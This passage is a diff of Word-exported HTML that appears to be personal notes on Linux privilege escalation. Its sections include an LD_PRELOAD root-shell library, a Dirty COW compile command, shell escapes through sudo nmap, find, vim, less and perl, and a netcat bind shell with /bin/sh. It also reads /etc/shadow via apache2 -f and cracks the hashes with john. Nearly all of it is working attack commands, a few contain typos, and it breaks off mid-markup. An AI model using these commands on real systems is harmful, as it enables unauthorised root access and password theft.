+<p class=MsoListParagraphCxSpMiddle style='margin-left:71.4pt;mso-add-space:
+auto'><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:71.4pt;mso-add-space:
+auto'><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>void_init() {<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:71.4pt;mso-add-space:
+auto'><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'><span style='mso-spacerun:yes'>   
+</span>unsetenv(&quot;LD_PRELOAD&quot;); <o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:53.4pt;mso-add-space:
+auto'><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'><span style='mso-spacerun:yes'>       </span>setgid(0);<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:53.4pt;mso-add-space:
+auto'><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'><span style='mso-spacerun:yes'>       </span>setuid(0);<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:71.4pt;mso-add-space:
+auto'><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'><span style='mso-spacerun:yes'>    </span>system(&quot;/bin/bash
+-p&quot;);<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:71.4pt;mso-add-space:
+auto'><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>}<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:71.4pt;mso-add-space:
+auto'><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:71.4pt;mso-add-space:
+auto'><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:yellow'>AND<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:71.4pt;mso-add-space:
+auto'><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:71.4pt;mso-add-space:
+auto'><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>gcc -fPIC -shared -nostartfiles -o /tmp/&lt;</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>FILE</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>&gt;.so &lt;</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>FILE</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>&gt;.c<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:53.4pt;mso-add-space:
+auto;text-indent:17.4pt'><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'>c execute &gt;&gt; </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>gcc c0w.c -pthread -o dirtcrow<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:53.4pt;mso-add-space:
+auto;text-indent:17.4pt'><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:71.4pt;mso-add-space:
+auto'><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:yellow'>AND RUN<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:71.4pt;mso-add-space:
+auto'><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoListParagraphCxSpLast style='margin-left:71.4pt;mso-add-space:auto'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>sudo LD_PRELOAD=/tmp/&lt;</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>FILE</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>&gt;.so find<o:p></o:p></span></p>
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>___________________________________________________________________________<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpFirst style='margin-left:71.4pt;mso-add-space:
+auto;text-indent:-18.0pt;mso-list:l21 level1 lfo32'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>2)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'>Nmap<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:89.4pt;mso-add-space:
+auto;text-indent:-18.0pt;mso-list:l8 level1 lfo33'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:Consolas;mso-fareast-font-family:
+Consolas;mso-bidi-font-family:Consolas;color:red'><span style='mso-list:Ignore'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp; </span></span></span><![endif]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>nmap –interactive<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:89.4pt;mso-add-space:
+auto;text-indent:-18.0pt;mso-list:l8 level1 lfo33'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:Consolas;mso-fareast-font-family:
+Consolas;mso-bidi-font-family:Consolas;color:red'><span style='mso-list:Ignore'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp; </span></span></span><![endif]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>!sh<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:89.4pt;mso-add-space:
+auto;text-indent:-18.0pt;mso-list:l8 level1 lfo33'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:Consolas;mso-fareast-font-family:
+Consolas;mso-bidi-font-family:Consolas;color:red'><span style='mso-list:Ignore'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp; </span></span></span><![endif]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>echo</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>
+&quot;os.execute('/bin/sh')&quot; &gt; </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>exploit.nse</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'><o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpLast style='margin-left:89.4pt;mso-add-space:auto'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>sudo nmap --script=</span><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:#00B0F0'>exploit.nse</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>___________________________________________________________________________<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpFirst style='margin-left:71.4pt;mso-add-space:
+auto;text-indent:-18.0pt;mso-list:l21 level1 lfo32'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>3)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'>Find<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-top:0cm;margin-right:0cm;
+margin-bottom:0cm;margin-left:89.4pt;mso-add-space:auto;text-indent:-18.0pt;
+line-height:normal;mso-list:l8 level1 lfo33'><![if !supportLists]><span
+style='font-size:12.0pt;font-family:Consolas;mso-fareast-font-family:Consolas;
+mso-bidi-font-family:Consolas;color:red;mso-fareast-language:TR'><span
+style='mso-list:Ignore'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:red;mso-fareast-language:TR'>touch
+ogilab<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-top:0cm;margin-right:0cm;
+margin-bottom:0cm;margin-left:89.4pt;mso-add-space:auto;text-indent:-18.0pt;
+line-height:normal;mso-list:l8 level1 lfo33'><![if !supportLists]><span
+style='font-size:12.0pt;font-family:Consolas;mso-fareast-font-family:Consolas;
+mso-bidi-font-family:Consolas;color:red;mso-fareast-language:TR'><span
+style='mso-list:Ignore'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:red;mso-fareast-language:TR'>find
+ogilab -exec whoami \;<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-top:0cm;margin-right:0cm;
+margin-bottom:0cm;margin-left:89.4pt;mso-add-space:auto;line-height:normal'><span
+style='font-size:12.0pt;font-family:"Times New Roman",serif;mso-fareast-font-family:
+"Times New Roman";color:red;mso-fareast-language:TR'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-top:0cm;margin-right:0cm;
+margin-bottom:0cm;margin-left:89.4pt;mso-add-space:auto;line-height:normal'><span
+style='font-size:12.0pt;font-family:"Times New Roman",serif;mso-fareast-font-family:
+"Times New Roman";color:#00B0F0;mso-fareast-language:TR'>OR<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-top:0cm;margin-right:0cm;
+margin-bottom:0cm;margin-left:89.4pt;mso-add-space:auto;line-height:normal'><span
+style='font-size:12.0pt;font-family:"Times New Roman",serif;mso-fareast-font-family:
+"Times New Roman";color:red;mso-fareast-language:TR'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:89.4pt;mso-add-space:
+auto;text-indent:-18.0pt;mso-list:l8 level1 lfo33'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:Consolas;mso-fareast-font-family:
+Consolas;mso-bidi-font-family:Consolas;color:red'><span style='mso-list:Ignore'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp; </span></span></span><![endif]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:red;mso-fareast-language:TR'>find
+ogilab -exec netcat -lvp 5555 -e /bin/sh \;</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'><o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:89.4pt;mso-add-space:
+auto;text-indent:-18.0pt;mso-list:l8 level1 lfo33'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:Consolas;mso-fareast-font-family:
+Consolas;mso-bidi-font-family:Consolas;color:red'><span style='mso-list:Ignore'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp; </span></span></span><![endif]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>netcat 192.168.1.189 5555<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:89.4pt;mso-add-space:
+auto'><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:89.4pt;mso-add-space:
+auto'><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>OR<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:89.4pt;mso-add-space:
+auto'><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoListParagraphCxSpLast style='margin-left:89.4pt;mso-add-space:auto;
+text-indent:-18.0pt;mso-list:l8 level1 lfo33'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:Consolas;mso-fareast-font-family:
+Consolas;mso-bidi-font-family:Consolas;color:red'><span style='mso-list:Ignore'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp; </span></span></span><![endif]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>find / -exec /user/bin/awk 'BEGIN {system(&quot;/bin/bash&quot;)}'
+\;<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>___________________________________________________________________________<o:p></o:p></span></p>
+
+<p class=MsoNormal style='tab-stops:119.25pt'><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B050'><span
+style='mso-spacerun:yes'>                </span></span><span style='font-size:
+12.0pt;line-height:107%;font-family:"Times New Roman",serif;color:yellow'>4) </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B050'>Vim<span style='mso-tab-count:1'>             </span><o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:71.4pt;tab-stops:119.25pt'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B050'>-</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif'><span style='mso-spacerun:yes'>  </span><span
+style='color:red'>vim.tiny /etc/shadow<o:p></o:p></span></span></p>
+
+<p class=MsoNormal style='margin-left:71.4pt;tab-stops:119.25pt'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>- sudo /usr/bin/vim -c '!/bin/sh’<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:71.4pt;tab-stops:119.25pt'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>OR<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpFirst style='margin-top:0cm;margin-right:0cm;
+margin-bottom:0cm;margin-left:89.4pt;mso-add-space:auto;text-indent:-18.0pt;
+line-height:normal;mso-list:l8 level1 lfo33'><![if !supportLists]><span
+style='font-size:12.0pt;font-family:Consolas;mso-fareast-font-family:Consolas;
+mso-bidi-font-family:Consolas;color:red;mso-fareast-language:TR'><span
+style='mso-list:Ignore'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:red;mso-fareast-language:TR'>vim.tiny<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-top:0cm;margin-right:0cm;
+margin-bottom:0cm;margin-left:89.4pt;mso-add-space:auto;text-indent:-18.0pt;
+line-height:normal;mso-list:l8 level1 lfo33'><![if !supportLists]><span
+style='font-size:12.0pt;font-family:Consolas;mso-fareast-font-family:Consolas;
+mso-bidi-font-family:Consolas;color:red;mso-fareast-language:TR'><span
+style='mso-list:Ignore'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:red;mso-fareast-language:TR'>#
+Press ESC key<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-top:0cm;margin-right:0cm;
+margin-bottom:0cm;margin-left:89.4pt;mso-add-space:auto;text-indent:-18.0pt;
+line-height:normal;mso-list:l8 level1 lfo33'><![if !supportLists]><span
+style='font-size:12.0pt;font-family:Consolas;mso-fareast-font-family:Consolas;
+mso-bidi-font-family:Consolas;color:red;mso-fareast-language:TR'><span
+style='mso-list:Ignore'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:red;mso-fareast-language:TR'>:set
+shell=/bin/sh<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpLast style='margin-top:0cm;margin-right:0cm;
+margin-bottom:0cm;margin-left:89.4pt;mso-add-space:auto;text-indent:-18.0pt;
+line-height:normal;mso-list:l8 level1 lfo33'><![if !supportLists]><span
+style='font-size:12.0pt;font-family:Consolas;mso-fareast-font-family:Consolas;
+mso-bidi-font-family:Consolas;color:red;mso-fareast-language:TR'><span
+style='mso-list:Ignore'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:red;mso-fareast-language:TR'>:Shell<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-top:0cm;margin-right:0cm;margin-bottom:0cm;
+margin-left:71.4pt;line-height:normal'><span style='font-size:12.0pt;
+font-family:"Times New Roman",serif;mso-fareast-font-family:"Times New Roman";
+color:red;mso-fareast-language:TR'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal style='margin-top:0cm;margin-right:0cm;margin-bottom:0cm;
+margin-left:71.4pt;line-height:normal'><span style='font-size:12.0pt;
+font-family:"Times New Roman",serif;mso-fareast-font-family:"Times New Roman";
+color:red;mso-fareast-language:TR'>OR<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-top:0cm;margin-right:0cm;margin-bottom:0cm;
+margin-left:71.4pt;line-height:normal'><span style='font-size:12.0pt;
+font-family:"Times New Roman",serif;mso-fareast-font-family:"Times New Roman";
+color:red;mso-fareast-language:TR'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal style='margin-top:0cm;margin-right:0cm;margin-bottom:0cm;
+margin-left:71.4pt;line-height:normal'><span style='font-size:12.0pt;
+font-family:"Times New Roman",serif;mso-fareast-font-family:"Times New Roman";
+color:red;mso-fareast-language:TR'>:set shell=/bin/bash<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-top:0cm;margin-right:0cm;margin-bottom:0cm;
+margin-left:71.4pt;line-height:normal'><span style='font-size:12.0pt;
+font-family:"Times New Roman",serif;mso-fareast-font-family:"Times New Roman";
+color:red;mso-fareast-language:TR'>:shell<o:p></o:p></span></p>
+
+<p class=MsoListParagraph style='margin-top:0cm;margin-right:0cm;margin-bottom:
+0cm;margin-left:89.4pt;mso-add-space:auto;line-height:normal'><span
+style='font-size:12.0pt;font-family:"Times New Roman",serif;mso-fareast-font-family:
+"Times New Roman";color:red;mso-fareast-language:TR'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>___________________________________________________________________________<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-top:0cm;margin-right:0cm;margin-bottom:0cm;
+margin-left:53.4pt;line-height:normal'><span style='font-size:12.0pt;
+font-family:"Times New Roman",serif;mso-fareast-font-family:"Times New Roman";
+color:yellow;mso-fareast-language:TR'>5) </span><span style='font-size:12.0pt;
+font-family:"Times New Roman",serif;mso-fareast-font-family:"Times New Roman";
+color:#00B050;mso-fareast-language:TR'>Bash<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-top:0cm;margin-right:0cm;margin-bottom:0cm;
+margin-left:71.4pt;line-height:normal'><span style='font-size:12.0pt;
+font-family:"Times New Roman",serif;mso-fareast-font-family:"Times New Roman";
+color:red;mso-fareast-language:TR'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoListParagraph style='margin-top:0cm;margin-right:0cm;margin-bottom:
+0cm;margin-left:89.4pt;mso-add-space:auto;text-indent:-18.0pt;line-height:normal;
+mso-list:l8 level1 lfo33'><![if !supportLists]><span style='font-size:12.0pt;
+font-family:Consolas;mso-fareast-font-family:Consolas;mso-bidi-font-family:
+Consolas;color:red;mso-fareast-language:TR'><span style='mso-list:Ignore'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp; </span></span></span><![endif]><span
+style='font-size:12.0pt;font-family:"Times New Roman",serif;mso-fareast-font-family:
+"Times New Roman";color:red;mso-fareast-language:TR'>bash -p<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:71.4pt;tab-stops:119.25pt'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B050'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>___________________________________________________________________________<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpFirst style='tab-stops:119.25pt'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B050'><span style='mso-spacerun:yes'>      </span></span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:yellow'>6) </span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'>Man, More, Less<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-top:0cm;margin-right:0cm;
+margin-bottom:0cm;margin-left:89.4pt;mso-add-space:auto;text-indent:-18.0pt;
+line-height:normal;mso-list:l8 level1 lfo33'><![if !supportLists]><span
+style='font-size:12.0pt;font-family:Consolas;mso-fareast-font-family:Consolas;
+mso-bidi-font-family:Consolas;color:red;mso-fareast-language:TR'><span
+style='mso-list:Ignore'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:red;mso-fareast-language:TR'>less
+/etc/passwd<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-top:0cm;margin-right:0cm;
+margin-bottom:0cm;margin-left:89.4pt;mso-add-space:auto;text-indent:-18.0pt;
+line-height:normal;mso-list:l8 level1 lfo33'><![if !supportLists]><span
+style='font-size:12.0pt;font-family:Consolas;mso-fareast-font-family:Consolas;
+mso-bidi-font-family:Consolas;color:red;mso-fareast-language:TR'><span
+style='mso-list:Ignore'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:red;mso-fareast-language:TR'>!/bin/sh<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpLast style='margin-top:0cm;margin-right:0cm;
+margin-bottom:0cm;margin-left:89.4pt;mso-add-space:auto;line-height:normal'><span
+style='font-size:12.0pt;font-family:"Times New Roman",serif;mso-fareast-font-family:
+"Times New Roman";color:red;mso-fareast-language:TR'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>___________________________________________________________________________<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-indent:35.4pt'><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:yellow'><span
+style='mso-spacerun:yes'>        </span>7) </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B050'>Apache2<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpFirst style='margin-left:89.4pt;mso-add-space:
+auto;text-indent:-18.0pt;mso-list:l8 level1 lfo33'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:Consolas;mso-fareast-font-family:
+Consolas;mso-bidi-font-family:Consolas;color:red'><span style='mso-list:Ignore'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp; </span></span></span><![endif]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>sudo /usr/sbin/apache2 -f /etc/shadow<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:89.4pt;mso-add-space:
+auto;text-indent:-18.0pt;mso-list:l8 level1 lfo33'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:Consolas;mso-fareast-font-family:
+Consolas;mso-bidi-font-family:Consolas;color:red'><span style='mso-list:Ignore'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp; </span></span></span><![endif]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>sudo /usr/sbin/apache2 -f /etc/passwd<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:89.4pt;mso-add-space:
+auto'><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:72.0pt;mso-add-space:
+auto;text-indent:17.4pt'><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>and use to unshadow<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:72.0pt;mso-add-space:
+auto;text-indent:17.4pt'><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:89.4pt;mso-add-space:
+auto;text-indent:-18.0pt;mso-list:l8 level1 lfo33'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:Consolas;mso-fareast-font-family:
+Consolas;mso-bidi-font-family:Consolas;color:red'><span style='mso-list:Ignore'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp; </span></span></span><![endif]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>save 2 file.txt and <o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:89.4pt;mso-add-space:
+auto;text-indent:-18.0pt;mso-list:l8 level1 lfo33'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:Consolas;mso-fareast-font-family:
+Consolas;mso-bidi-font-family:Consolas;color:red'><span style='mso-list:Ignore'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp; </span></span></span><![endif]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>unshadow</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'> passwd.txt shadowtxt<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpLast style='margin-left:89.4pt;mso-add-space:auto;
+text-indent:-18.0pt;mso-list:l8 level1 lfo33'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:Consolas;mso-fareast-font-family:
+Consolas;mso-bidi-font-family:Consolas;color:#00B0F0'><span style='mso-list:
+Ignore'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp; </span></span></span><![endif]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>john --wordlist=</span><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:#00B0F0'>wordlist.txt
+password.txt<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>___________________________________________________________________________<o:p></o:p></span></p>
+
+<p class=MsoListParagraph style='text-indent:34.8pt'><span style='font-size:
+12.0pt;line-height:107%;font-family:"Times New Roman",serif;color:yellow'>8) </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B050'>perl</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'><o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:70.8pt;text-indent:35.4pt'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:yellow'>perl</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'> -e 'exec
+&quot;/bin*bash&quot;;'<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>___________________________________________________________________________<o:p></o:p></span></p>
+
+<p class=MsoListParagraph style='text-indent:34.8pt'><span style='font-size:
+12.0pt;line-height:107%;font-family:"Times New Roman",serif;color:yellow'>9) </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B050'>awk</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'><o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:70.8pt;text-indent:35.4pt'><span
